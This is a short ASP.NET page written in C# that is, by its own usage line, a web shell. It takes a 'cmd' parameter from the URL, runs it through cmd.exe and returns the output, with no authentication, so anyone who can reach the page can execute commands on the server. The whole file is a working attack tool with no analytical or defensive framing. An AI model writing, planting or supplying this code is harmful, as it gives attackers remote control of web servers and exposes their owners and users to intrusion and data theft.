<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(Request.QueryString["cmd"]))
        {
            string command = Request.QueryString["cmd"];
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            Process process = new Process();
            process.StartInfo = psi;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
        }
        else
        {
            Response.Write("Usage: yourwebshell.aspx?cmd=your_command");
        }
    }
</script>
